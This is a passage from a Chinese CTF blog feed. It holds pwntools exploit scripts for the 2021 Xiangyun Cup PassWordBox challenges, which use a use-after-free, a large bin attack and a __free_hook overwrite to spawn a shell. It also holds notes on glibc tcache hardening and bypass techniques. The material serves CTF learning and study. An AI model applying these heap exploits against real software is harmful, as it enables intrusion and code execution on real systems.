class="hljs-number">2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">12</span>):<br>    add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">12</span>):<br>    free(i)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x160</span>^key))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>) <span class="hljs-comment">#合并</span><br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#按照索引顺序，以防乱了</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">11</span>):<br>    add(i, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Pwd is: &quot;</span>)<br>base = u64(p.recv(<span class="hljs-number">8</span>))^key<br>base -= <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %base)<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">2</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x28</span>, p64(sys^key))<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x28</span>, p64(<span class="hljs-number">0x68732f6e69622f</span>^key))<br><br>free(<span class="hljs-number">13</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="PassWordBox-ProVersion"><a href="#PassWordBox-ProVersion" class="headerlink" title="PassWordBox_ProVersion"></a>PassWordBox_ProVersion</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228194718202.png"><span class="image-caption">image-20220228194718202</span></p>
<p>64位，glibc版本2.31，函数功能跟上题差不多，所以只分析不同的部分。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091635089.png"><span class="image-caption">image-20220304091635089</span></p>
<p>申请的堆的大小只能为large chunk了，同时 offbynull 修复。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091812982.png"><span class="image-caption">image-20220304091812982</span></p>
<p>edit功能不再限制次数。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091900358.png"><span class="image-caption">image-20220304091900358</span></p>
<p>delete存在UAF漏洞。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304091916950.png"><span class="image-caption">image-20220304091916950</span></p>
<p>新增功能recover，看着功能像是为了帮助UAF更加的UAF</p>
<p>刚开始最先仍然是用相同的手法进行泄露出key值，后续的利用手法才有改变，要使用large bin attack了。</p>
<p>在利用前，引入一个有意思的机制，看看tcache_perthread_struct结构体的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>

<p>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk；tcache_entry数组的大小为TCACHE_MAX_BINS，是 tcache 的最大数量，宏定义为64，如果结合large bin attack，我们可以将这个TCACHE_MAX_BINS数改成一个大数，那么几乎每个 chunk 块 free 之后都会进入 tcache。该结构具体位置按下图方式可以查找到。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304094405889.png"><span class="image-caption">image-20220304094405889</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304104133443.png"><span class="image-caption">image-20220304104133443</span></p>
<p>利用 large bin attack 成功修改 tcache_max_bins 值。然后就是把 large chunk 放入到tcache中，借着UAF修改fd指针，申请堆块到free_hook 上即可</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220304110037381.png"><span class="image-caption">image-20220304110037381</span></p>
<p>成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwdPro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Add:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;Input The ID You Want Save:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;Length Of Your Pwd:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Your Pwd:&quot;</span>)<br>    p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Edit:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Check:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Idx you want 2 Delete:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recov</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Idx you want 2 Recover:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x460</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Save ID:&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>key = u64(p.recv(<span class="hljs-number">8</span>))<br>log.info(<span class="hljs-string">&quot;key==&gt;0x%x&quot;</span> %key)<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x450</span> ,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>recov(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Pwd is: &quot;</span>)<br>base = (u64(p.recv(<span class="hljs-number">8</span>))^key) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %base)<br>free_hook = base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>tcache_max_bins = base + <span class="hljs-number">0x1eb2d0</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Pwd is: &quot;</span>)<br>fd = u64(p.recv(<span class="hljs-number">8</span>))^key<br>p.recv(<span class="hljs-number">8</span>)<br>fd_nextsize = u64(p.recv(<span class="hljs-number">8</span>))^key<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>, p64(fd)*<span class="hljs-number">2</span> + p64(fd_nextsize) + p64(tcache_max_bins - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br>recov(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(free_hook))<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x500</span>, p64(sys^key))<br>edit(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>复现思路来源：<a href="https://blog.csdn.net/woodwhale/article/details/120635062">https://blog.csdn.net/woodwhale/article/details/120635062</a></p>
]]></content>
      <tags>
        <tag>祥云杯PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>libc版本检查机制</title>
    <url>/2021/08/30/2021-08-30-libc%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇本章是以libc-2.23.so为基础，去对比之后版本的差异问题</p>
<h2 id="libc-2-27-so"><a href="#libc-2-27-so" class="headerlink" title="libc-2.27.so"></a>libc-2.27.so</h2><h3 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h3><p>tcache是在libc-2.27.so引进的一种新机制</p>
<h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a><strong>tcache_entry</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a><strong>tcache_perthread_struct</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS]; <br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用单向链表 (<code>tcache_entry</code>) 的方式连接释放的 chunk，这一点上和 fastbin 很像</li>
<li>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></li>
<li><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</li>
<li>tcache_entry用于链接 chunk 结构体，其中的next指针指向下一个大小相同的 chunk<ul>
<li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后</li>
</ul>
</li>
</ul>
<p>简单来说：就是类似fastbin一样的东西，每条链上最多可以有 7 个 chunk，free堆块的时候优先放入tcache中，满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找（tcache的范围是 [0x20, 0x410]，超过这个大小的就会放入unsorted bin）</p>
<p>tcache dup：因为前几个版本的 <code>tcache bin</code>是缺乏校验机制的，即使对<code>tcache bin chunk</code>重复释放，也不会引发任何异常。比<code>fastbin chunk</code>的约束更少，一来不检查size域，二来也不检查是否重复释放</p>
<p><code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去（前提是先修改0x250大小堆块的count为7），然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存。</p>
<h3 id="高版本Tcache"><a href="#高版本Tcache" class="headerlink" title="高版本Tcache"></a>高版本Tcache</h3><p>一、在libc-2.29.so及以上的版本往tcache结构体添加了一个<code>key</code>来防止double free，判断条件就是tcache_entry的key指针（被释放堆块的bk指针位置上填入tcache的地址）是否等于<strong>tcache bin</strong>的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>绕过：利用UAF或者溢出等等，修改被释放堆块next指针</p>
<p>以及Stash机制：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"> <span class="hljs-keyword">if</span> ((unsigned long)(nb) &lt;= (unsigned long)(get<span class="hljs-constructor">_max_fast()</span>)) <span class="hljs-comment">//size在fastbin范围内</span><br>  &#123;<br>    idx = fastbin<span class="hljs-constructor">_index(<span class="hljs-params">nb</span>)</span>;<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp;<br>    victim = *fb;<br> <br>    <span class="hljs-keyword">if</span> (victim != NULL) <span class="hljs-comment">//如果有chunk</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span><br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-constructor">REMOVE_FB(<span class="hljs-params">fb</span>, <span class="hljs-params">pp</span>, <span class="hljs-params">victim</span>)</span>;<br> <br>      <span class="hljs-keyword">if</span> (<span class="hljs-constructor">__glibc_likely(<span class="hljs-params">victim</span> != NULL)</span>) <br>      &#123;<br>        size_t victim_idx = fastbin<span class="hljs-constructor">_index(<span class="hljs-params">chunksize</span>(<span class="hljs-params">victim</span>)</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-constructor">__builtin_expect(<span class="hljs-params">victim_idx</span> != <span class="hljs-params">idx</span>, 0)</span>) <span class="hljs-comment">//对fastbin的size检查</span><br>          malloc<span class="hljs-constructor">_printerr(<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>)</span>;<br>        check<span class="hljs-constructor">_remalloced_chunk(<span class="hljs-params">av</span>, <span class="hljs-params">victim</span>, <span class="hljs-params">nb</span>)</span>;<br> <br>#<span class="hljs-keyword">if</span> <span class="hljs-number">1</span> <span class="hljs-comment">//if USE_TCACHE，Stash过程：把剩下的放入Tcache中</span><br>        <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">		 stash them in the tcache.  */</span><br>        size_t tc_idx = csize2tidx(nb);<br>        <span class="hljs-keyword">if</span> (tcache<span class="hljs-operator"> &amp;&amp; </span>tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span><br>        &#123;<br>          mchunkptr tc_victim;<br> <br>          <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>          <span class="hljs-keyword">while</span> (tcache-&gt;counts<span class="hljs-literal">[<span class="hljs-identifier">tc_idx</span>]</span> &lt; mp_.tcache_count<span class="hljs-operator"> &amp;&amp; </span>(tc_victim = *fb) != NULL) <span class="hljs-comment">//只要tcache没空，并且fastbin还有chunk</span><br>          &#123;<br>            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//那么就从fastbin中取出</span><br>              *fb = tc_victim-&gt;fd;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-constructor">REMOVE_FB(<span class="hljs-params">fb</span>, <span class="hljs-params">pp</span>, <span class="hljs-params">tc_victim</span>)</span>;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-constructor">__glibc_unlikely(<span class="hljs-params">tc_victim</span> <span class="hljs-operator">==</span> NULL)</span>)<br>                break;<br>            &#125;<br>            tcache<span class="hljs-constructor">_put(<span class="hljs-params">tc_victim</span>, <span class="hljs-params">tc_idx</span>)</span>;<span class="hljs-comment">//然后放入tcache中</span><br>          &#125;<br>        &#125;<br>#endif<br>        void *p = chunk2mem(victim);<br>        alloc<span class="hljs-constructor">_perturb(<span class="hljs-params">p</span>, <span class="hljs-params">bytes</span>)</span>;<br>        return p;<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的链表中去</p>
<p>这么做会存在一些问题，对于比较典型的 fastbin double free 产生了一个很有趣的影响：</p>
<p>首先需要先释放7个chunk，填满tcache，然后free(C7) Free(C8) Free(C7)，在fastbin中构造出环</p>
<p>下一步，为了分配到fastbin，需要先申请7个，让Tcache为空，再次申请时就会使用fastbin中的C7，这一步就也就整个手法的精华。取出C7后，Stash会把fastbin链表中的chunk全部放入Tcache中，而C7又是被我们分配到的堆块，是可控的，这就导致我们不需要伪造size字段，获得了一个真正的任意写。</p>
<p>二、在<code> libc-2.32.so</code>版本中新加入了一个 key 会对 tcache next 的内容进行异或</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="hljs-comment">//不是直接赋值next</span><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure>

<p>PROTECT_PTR：对 pos 右移了 12 位（去除了末尾的 3 位信息），再异或原来的指针（在这之前 next 储存的堆地址）。</p>
<p>而这里的 <strong>key 就是储存内容的指针（在代码中叫做 pos）</strong>，在放入的时候让内容与这个 <strong>key</strong> 进行异或再储存，在取出的时候让内容与这个 <strong>key</strong> 进行异或再取出。而得益于这个秘钥就是储存内容的指针，所以无需使用其他空间来放置这个 <strong>key</strong> 的内容，只需要保存异或之后的内容，在解密时只需 <strong>PROTECT_PTR (&amp;ptr, ptr)</strong> 这样操作即可。</p>
<p>需要注意的是，当 tcache 中只有一个元素的时候，也就是在放入这个元素的过程中，<strong>tcache-&gt;entries[tc_idx] == 0</strong>，在这个时候放入元素的时候会异或 0，也就是在 <strong>e-&gt;next 位置存放</strong>的内容正好就是 <strong>key 的信息</strong>，因为 <strong>key 异或 0 还是秘钥</strong>。而且就算之后加入了其他的元素，这个元素始终还是在链表的尾部，所以内容不会发生变化</p>
<p>绕过：</p>
<ul>
<li>通过 0 异或秘钥还是秘钥的这个特性，当 tcache 链上只有一个指针的时候，我们就可以通过 show 函数来 leak 出秘钥的信息，有了秘钥的信息之后，我们就可以伪造秘钥信息了</li>
<li>可以通过 largebin 来泄露堆地址，由于 key 是当前指针 &gt;&gt; 12，所以我们可以确保在 4096 字节内这个 key 都是正确的</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="一、泄露堆基址"><a href="#一、泄露堆基址" class="headerlink" title="一、泄露堆基址"></a>一、泄露堆基址</h4><p>构造两个相同 size 的堆块 a 和 b，我们先 free (a) 让他进入到 tcache 中，再 free (b) 也让他进入到 tcache 中。这时候，在堆块 b 的 fd 位置就存在着堆块 a 的地址，我们 leak 出来就能够得到堆地址</p>
<h2 id="libc-2-29-so"><a href="#libc-2-29-so" class="headerlink" title="libc-2.29.so"></a>libc-2.29.so</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (size &gt; av-&gt;system_mem)) 				malloc_printerr (<span class="hljs-string">&quot;malloc: invalid size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: mismatching next-&gt;prev_size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) 		malloc_printerr (<span class="hljs-string">&quot;malloc: unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next))) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next-&gt;prev_inuse (unsorted)&quot;</span>); ...... ...... <span class="hljs-comment">/* remove from unsorted list */</span> <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc: corrupted unsorted chunks 3&quot;</span>);<br>	unsorted_chunks (av)-&gt;bk = bck; <br>	bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>

<ul>
<li><p>对于<code>unsortbin</code>的解链添加了验证链完整性的检查，让 <code>unsortbin attack</code>失效</p>
<ul>
<li><p>绕过：</p>
<p>1.largebin中的chunk-&gt;fd_nextsize=0;</p>
<p>2.largebin中的chunk-&gt;bk_nextsize可控制;</p>
<p>3.unsortedbin里的chunk大于largebin，并且如果进入largebin，是同一个index。</p>
</li>
</ul>
</li>
</ul>
<h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><p>类unlink手法，高版本一样可用，至少目前我知道的：到libc-2.32是没问题的</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.<code>smallbin</code>中可以控制大小为size块的bk指针</p>
<p>2.<code>tcache</code>中大小为size块的个数为6</p>
<p>3.申请堆块是<code>calloc</code></p>
